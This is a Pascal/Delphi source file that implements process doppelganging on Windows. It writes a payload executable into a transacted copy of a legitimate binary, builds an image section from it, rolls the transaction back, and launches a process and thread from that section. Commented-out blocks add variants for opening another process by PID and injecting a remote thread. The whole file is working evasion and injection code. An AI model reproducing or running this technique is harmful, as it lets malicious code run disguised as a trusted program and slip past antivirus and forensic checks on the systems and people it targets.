program NtCreateThread;

uses windows,sysutils, ntdll;

var
dummy:dword;



   function CreateFileTransactedW(
                    lpFileName:LPCWSTR;
                      dwDesiredAccess:DWORD;
                      dwShareMode:DWORD;
      lpSecurityAttributes:LPSECURITY_ATTRIBUTES;
                      dwCreationDisposition:DWORD;
                      dwFlagsAndAttributes:DWORD;
                     hTemplateFile:THANDLE;
                     hTransaction:THANDLE;
                    pusMiniVersion:PUSHORT;
                      lpExtendedParameter:PVOID
   ): THANDLE; stdcall; stdcall; external 'kernel32.dll';

   function GetProcessId(Process: THandle): DWORD; stdcall; external 'kernel32.dll' name 'GetProcessId';

   //function ImageNtHeader(Base: Pointer): PIMAGE_NT_HEADERS; stdcall; external 'dbghelp.dll';

   procedure InitializeObjectAttributes(var p: TObjectAttributes; n:PUNICODE_STRING;
                                             a: ULONG; r: THandle; s: PVOID);
   begin
     p.Length := SizeOf(OBJECT_ATTRIBUTES);
     p.RootDirectory := r;
     p.Attributes := a;
     p.ObjectName := n;
     p.SecurityDescriptor := s;
     p.SecurityQualityOfService := nil;
   end;

   procedure main(targetapp,payload:widestring);
   var
      targetHandle :thandle=thandle(-1);
   hprocess :thandle=thandle(-1);
   SectionHandle:thandle=thandle(-1);
   hTransaction:thandle=thandle(-1);
   hTransactedFile:thandle=thandle(-1);
   Attrib:OBJECT_ATTRIBUTES;
   ClientId:CLIENT_ID;
   ScectionDataSize:TLargeInteger; //size of the payload
    localSectionAddress :pvoid= nil;
     localSectionOffset :LARGE_INTEGER;
     remoteSectionAddress:pvoid = nil;
     RemoteThread :thandle=0;
     outFile:thandle=thandle(-1);
     buffer:pointer=nil;
     temp:array [0..$1000-1] of byte;
     bytesread:dword=0;
     byteswritten:dword=0;
     status:NTSTATUS;
     pbi:PROCESS_BASIC_INFORMATION;
     ReturnLength,numberofbytesread:ulong;
     EntryPoint:nativeuint;
     ntheaders:PIMAGE_NT_HEADERS;
     ImageBaseAddress:nativeuint;
     ustr:UNICODE_STRING ;
     ProcessParameters:PRTL_USER_PROCESS_PARAMETERS=nil;
     MemoryPtr:pvoid=nil;
     peb_:PPEB;
     n:NativeUInt ;
   begin
     {
     //test local peb
     status := NtQueryInformationProcess(GetCurrentProcess ,ProcessBasicInformation,@pbi,sizeof(PROCESS_BASIC_INFORMATION),@ReturnLength);
     writeln('NtQueryInformationProcess:'+inttohex(status,sizeof(status)));
     if status<>0 then exit;
     writeln('PebBaseAddress:'+inttohex(nativeuint(pbi.PebBaseAddress),sizeof(pointer)));
     writeln('UniqueProcessId:'+inttostr(pbi.UniqueProcessId));

     numberofbytesread:=0;
     status:=NtReadVirtualMemory(hProcess, pointer(nativeuint(pbi.PebBaseAddress)+$10), @ImageBaseAddress, sizeof(pvoid), @numberofbytesread );
     writeln('NtReadVirtualMemory:'+inttohex(status,sizeof(status)));
     writeln('ImageBaseAddress:'+inttohex(ImageBaseAddress,sizeof(ImageBaseAddress)));

     numberofbytesread:=0;
     status:=NtReadVirtualMemory(hProcess, pointer(nativeuint(pbi.PebBaseAddress)+$20), @n, sizeof(pvoid), @numberofbytesread );
     writeln('NtReadVirtualMemory:'+inttohex(status,sizeof(status)));
     writeln('ProcessParameters:'+inttohex(n,sizeof(n)));

     //lets read the whole PEB
     numberofbytesread:=0;
     getmem(peb_,sizeof(PEB));
     status:=NtReadVirtualMemory(hProcess, pbi.PebBaseAddress, peb_, sizeof(PEB), @numberofbytesread );
     writeln('NtReadVirtualMemory:'+inttohex(status,sizeof(status)));

     writeln('ImageBaseAddress:'+inttohex(nativeuint(peb_^.ImageBaseAddress),sizeof(n) ) );
     writeln('ProcessParameters:'+inttohex(nativeuint(peb_^.ProcessParameters),sizeof(pointer)));
     writeln(strpas(peb_^.ProcessParameters^.CommandLine.Buffer ) );

     //lets overwrite processparameters address
     status:=NtWriteVirtualMemory(hProcess, pointer(nativeuint(pbi.PebBaseAddress)+$20), @n, sizeof(pvoid), @numberofbytesread );
     writeln('NtWriteVirtualMemory:'+inttohex(status,sizeof(status)));

     numberofbytesread:=0;
     status:=NtReadVirtualMemory(hProcess, pointer(nativeuint(pbi.PebBaseAddress)+$20), @n, sizeof(pvoid), @numberofbytesread );
     writeln('NtReadVirtualMemory:'+inttohex(status,sizeof(status)));
     writeln('ProcessParameters:'+inttohex(n,sizeof(n)));


     //
     exit;
     }
     //***************** lets read the payload
     writeln('****************');
     outFile := CreateFilew(pwidechar(payload), GENERIC_READ, 0, nil, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL , 0);
     if outFile=thandle(-1) then exit;
     bytesread:=GetFileSize(outfile,nil) ;
     writeln('bytesread='+inttostr(bytesread));
     if bytesread =0 then exit;
     getmem(buffer,bytesread );
     if readfile(outfile,buffer^,bytesread,bytesread,nil)=false then writeln('readfile false');
     writeln('bytesread='+inttostr(bytesread));
     CloseHandle(outfile);

     ScectionDataSize  :=bytesread;


     {
     //if we want to hijack another process
     InitializeObjectAttributes(Attrib ,nil,0,0,nil);
     fillchar(clientid,sizeof(clientid),0);
     clientid.UniqueProcess :=88748;
     status:=NtOpenProcess(@targetHandle, {$1F0FFF}PROCESS_ALL_ACCESS, @Attrib, @clientid );
     writeln('NtOpenProcess:'+inttohex(status,sizeof(status)));
     if status<>0 then exit;
     }

     //************** lets create a transacted file
     writeln('****************');
     InitializeObjectAttributes(Attrib ,nil,0,0,nil);
     status := NtCreateTransaction(@hTransaction,TRANSACTION_ALL_ACCESS,@Attrib,nil,0,0,0,0,nil,nil);
     writeln('NtCreateTransaction:'+inttohex(status,sizeof(status)));
     if status<>0 then exit;


     writeln('targetapp:'+(targetapp));
     //we could use DWORD size = GetTempPathW(MAX_PATH, temp_path);  GetTempFileNameW(temp_path, L"TH", 0, dummy_name);
     hTransactedFile:=CreateFileTransactedw(pwidechar(targetapp), GENERIC_WRITE or GENERIC_READ,0,nil,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0,hTransaction,nil,nil);
     if hTransactedFile =thandle(-1) then
                 begin
                 writeln('hTransactedFile=invalid handle');
                 exit;
                 end;

     if WriteFile(hTransactedFile, Buffer^, ScectionDataSize, byteswritten, nil) =false then
                 begin
                 writeln('WriteFile failed');
                 exit;
                 end
                 else writeln('byteswritten:'+inttostr(byteswritten));

     //************* lets create a section against this transacted file
     writeln('****************');
     status:=NtCreateSection(@SectionHandle,SECTION_ALL_ACCESS,nil,nil,PAGE_READONLY,SEC_IMAGE,hTransactedFile);
     //status:=NtCreateSection(@SectionHandle, $E, nil, @ScectionDataSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, nil );
     writeln('NtCreateSection:'+inttohex(status,sizeof(status)));
     if SectionHandle <=0 then exit;
     if status<>0 then exit;

     status := NtRollbackTransaction(hTransaction, TRUE);
     writeln('NtRollbackTransaction:'+inttohex(status,sizeof(status)));


     CloseHandle(hTransactedFile);
     hTransactedFile := INVALID_HANDLE_VALUE;

     NtClose(hTransaction);
     hTransaction := 0;


     {
     localSectionOffset.QuadPart :=0;
     //kind of NtWriteVirtualMemory
     status:=NtMapViewOfSection( SectionHandle, thandle(-1), @localSectionAddress, 0, 0, @localSectionOffset, @ScectionDataSize , $2, $0, $4 );
     writeln('NtMapViewOfSection:'+inttohex(status,sizeof(status)));
     writeln('localSectionAddress:'+inttohex(nativeuint(localSectionAddress),sizeof(localSectionAddress)));
     if localSectionAddress=nil then exit;

     status:=NtMapViewOfSection( SectionHandle, targetHandle, @remoteSectionAddress, 0, 0, @localSectionOffset, @ScectionDataSize , $2, $0, $20 );
     writeln('NtMapViewOfSection:'+inttohex(status,sizeof(status)));
     writeln('remoteSectionAddress:'+inttohex(nativeuint(remoteSectionAddress),sizeof(remoteSectionAddress)));
     if localSectionAddress=nil then exit;

     CopyMemory (localSectionAddress ,buffer,ScectionDataSize  );
     }

     {
     //readln;
     //remoteSectionAddress OK but what about entrypoint
     status:=NtCreateThreadEx(@RemoteThread, $1FFFFF{THREAD_ALL_ACCESS}, nil, targetHandle, remoteSectionAddress, nil, false, 0, nil, nil, nil );
     writeln('NtCreateThreadEx:'+inttohex(status,sizeof(status)));
     //remoteSectionAddress:E6FFC20000
     //Exception non gérée à 0x000000E6FFC20004 dans cmd.exe : 0xC0000005 :
     //Violation d'accès lors de l'écriture à l'emplacement 0x0000001CDFF84000.
     }

     //************** lets create the process from the section
     writeln('****************');
             ZeroMemory(@hprocess,sizeof(hprocess));
             status := NtCreateProcessEx(@hProcess,
                 PROCESS_ALL_ACCESS,
                 nil,
                 ntCurrentProcess,
                 PS_INHERIT_HANDLES,
                 SectionHandle,
                 0,
                 0,
                 FALSE);

             writeln('NtCreateProcessEx:'+inttohex(status,sizeof(status)));
             //if status<>0 then exit;
             writeln('pid:'+inttostr(GetProcessID(hProcess)));

     //        https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-erref/596a1078-e883-4972-9bbc-49e60bebca55
     //        0xC0000024 STATUS_OBJECT_TYPE_MISMATCH
     //C0000049	STATUS_SECTION_NOT_IMAGE
     //C0000020	STATUS_INVALID_FILE_FOR_SECTION

     // **************** lets get the entry point
     writeln('****************');
     fillchar(pbi,sizeof(pbi),0);
     status := NtQueryInformationProcess(hProcess,ProcessBasicInformation,@pbi,sizeof(PROCESS_BASIC_INFORMATION),@ReturnLength);
     writeln('NtQueryInformationProcess:'+inttohex(status,sizeof(status)));
     if status<>0 then exit;
     writeln('PebBaseAddress:'+inttohex(nativeuint(pbi.PebBaseAddress),sizeof(pointer)));
     writeln('UniqueProcessId:'+inttostr(pbi.UniqueProcessId)) ;

      //getmem(buffer,$1000);
      fillchar(temp,sizeof(temp),0);
      //status:=NtReadVirtualMemory(hProcess, (pbi.PebBaseAddress), @temp[0], $1000, @numberofbytesread );
      //https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/api/pebteb/peb/index.htm
      status:=NtReadVirtualMemory(hProcess, pointer(nativeuint(pbi.PebBaseAddress)+$10), @ImageBaseAddress, sizeof(pvoid), @numberofbytesread );
      //if ReadProcessMemory (hprocess,pbi.PebBaseAddress ,@temp[0],$1000,@numberofbytesread )=true then status:=0;
      writeln('NtReadVirtualMemory:'+inttohex(status,sizeof(status)));
      writeln('ImageBaseAddress:'+inttohex(ImageBaseAddress,sizeof(ImageBaseAddress)));
      //writeln('numberofbytesread:'+inttostr(numberofbytesread));
      if status<>0 then exit;

      ntheaders:=RtlImageNtHeader(Buffer);

      //writeln(inttohex(nativeuint(ntheaders),sizeof(pointer))) ;
      EntryPoint := ntheaders^.OptionalHeader.AddressOfEntryPoint;
      EntryPoint := EntryPoint + ImageBaseAddress;
      writeln('EntryPoint:'+inttohex(EntryPoint,sizeof(EntryPoint)));

      //*********** Allocate memory in target process and write process parameters block.
      writeln('****************');
      RtlInitUnicodeString(@ustr, pwstr(targetapp ));
      writeln('targetapp:'+strpas(ustr.Buffer) );
      //zeromemory(ProcessParameters,sizeof(ProcessParameters));
        status := RtlCreateProcessParametersEx(@ProcessParameters,
            @ustr,
            nil,
            nil,
            @ustr,
            nil,
            nil,
            nil,
            nil,
            nil,
            RTL_USER_PROC_PARAMS_NORMALIZED);
      writeln('RtlCreateProcessParametersEx:'+inttohex(status,sizeof(status)));
      writeln('ProcessParameters:'+inttohex(nativeuint(ProcessParameters),sizeof(nativeuint)));
      writeln('CommandLine:'+strpas(ProcessParameters^.CommandLine.Buffer  ))  ;

      //numberofbytesread := align(ProcessParameters^.EnvironmentSize + ProcessParameters^.MaximumLength,$1000);
      numberofbytesread := ProcessParameters^.EnvironmentSize + ProcessParameters^.MaximumLength;
      //numberofbytesread:=align(numberofbytesread,$1000);
      writeln('numberofbytesread:'+inttostr(numberofbytesread));

      MemoryPtr := ProcessParameters;

      status := NtAllocateVirtualMemory(hProcess,@MemoryPtr,0,@numberofbytesread,MEM_RESERVE or MEM_COMMIT,PAGE_READWRITE);
      writeln('NtAllocateVirtualMemory:'+inttohex(status,sizeof(status)));
      writeln('MemoryPtr:'+inttohex(nativeuint(MemoryPtr),sizeof(nativeuint)));
      numberofbytesread := 0;
      status := NtWriteVirtualMemory(hProcess,ProcessParameters,ProcessParameters,ProcessParameters^.EnvironmentSize + ProcessParameters^.MaximumLength,@numberofbytesread );
      //or
      //status := NtWriteVirtualMemory(hProcess,MemoryPtr,ProcessParameters,ProcessParameters^.EnvironmentSize + ProcessParameters^.MaximumLength,@numberofbytesread );
      writeln('NtWriteVirtualMemory:'+inttohex(status,sizeof(status)));
      writeln('numberofbytesread:'+inttostr(numberofbytesread));
      //0x8000000D   STATUS_PARTIAL_COPY

      //************Update PEB->ProcessParameters pointer to newly allocated block.

      //Peb_ := pbi.PebBaseAddress;
      //writeln('Peb:'+inttohex(nativeuint(Peb),sizeof(pointer)));
      n:=nativeuint(MemoryPtr );
      //n:=nativeuint(addr(MemoryPtr));
      writeln('MemoryPtr:'+inttohex(nativeuint(MemoryPtr ),sizeof(n)));
      //writeln('MemoryPtr:'+inttohex(nativeuint(addr(MemoryPtr)),sizeof(n)));
      numberofbytesread := 0;
      //status:=NtWriteVirtualMemory(hProcess,pointer(nativeuint(pbi.PebBaseAddress)+$20),ProcessParameters,sizeof(PVOID),@numberofbytesread);
      //or
      status:=NtWriteVirtualMemory(hProcess,pointer(nativeuint(pbi.PebBaseAddress)+$20),@n,sizeof(PVOID),@numberofbytesread);
      writeln('NtWriteVirtualMemory:'+inttohex(status,sizeof(status)));
      writeln('numberofbytesread:'+inttostr(numberofbytesread));
      //check memory
      //status:=NtReadVirtualMemory(hProcess, pointer(nativeuint(pbi.PebBaseAddress)+$20), @n, sizeof(pvoid), @numberofbytesread );
      //writeln('n:'+inttohex(nativeuint(n ),sizeof(n)));
      //
      //readln;
      writeln('****************');
      RemoteThread := 0;
        status := NtCreateThreadEx(@RemoteThread,
            THREAD_ALL_ACCESS,
            nil,
            hProcess,
            pointer(EntryPoint),
            nil,
            FALSE,
            0,
            nil,
            nil,
            nil);
        writeln('NtCreateThreadEx:'+inttohex(status,sizeof(status)));
      //

     //NtClose( targetHandle );
     //NtClose( SectionHandle );
     //NtClose( remoteSectionAddress );
     //NtClose( localSectionAddress );
     //NtClose( RemoteThread );
   end;

begin


  main('c:\temp\PsExec64.exe','c:\_apps\putty.exe');

end.

